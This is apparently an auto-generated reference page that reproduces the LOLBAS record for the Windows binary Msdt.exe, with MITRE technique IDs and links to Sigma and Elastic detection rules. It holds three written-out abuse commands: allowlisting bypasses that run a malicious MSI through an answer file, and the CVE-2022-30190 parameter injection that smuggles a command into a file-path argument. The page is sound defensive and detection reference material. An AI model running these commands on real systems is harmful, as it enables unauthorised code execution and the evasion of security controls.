---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Msdt.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msdt.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msdt.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Msdt.exe](../../tools/windows/msdt.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | msdt.exe |
| name | Msdt.exe |
| type | tool |
| source | lolbas |
| url | https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@nas_bench'
  Person: Nasreddine Bencherchali
Author: Oddvar Moe
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/PCW8E57.xml
Commands:
- Category: Execute
  Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
  Description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Application: GUI
  - Execute: MSI
  Usecase: Execute code
- Category: AWL Bypass
  Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
  Description: Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Application: GUI
  - Execute: MSI
  Usecase: Execute code bypass Application whitelisting
- Category: AWL Bypass
  Command: msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
  Description: Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module
    (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security
    update.
  MitreID: T1202
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Application: GUI
  - Execute: CMD
  Usecase: Execute code bypass Application allowlisting
Created: 2018-05-25
Description: Microsoft diagnostics tool
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
Full_Path:
- Path: C:\Windows\System32\Msdt.exe
- Path: C:\Windows\SysWOW64\Msdt.exe
Name: Msdt.exe
Resources:
- Link: https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
- Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
- Link: https://twitter.com/harr0ey/status/991338229952598016
- Link: https://twitter.com/nas_bench/status/1531944240271568896
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msdt.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
```
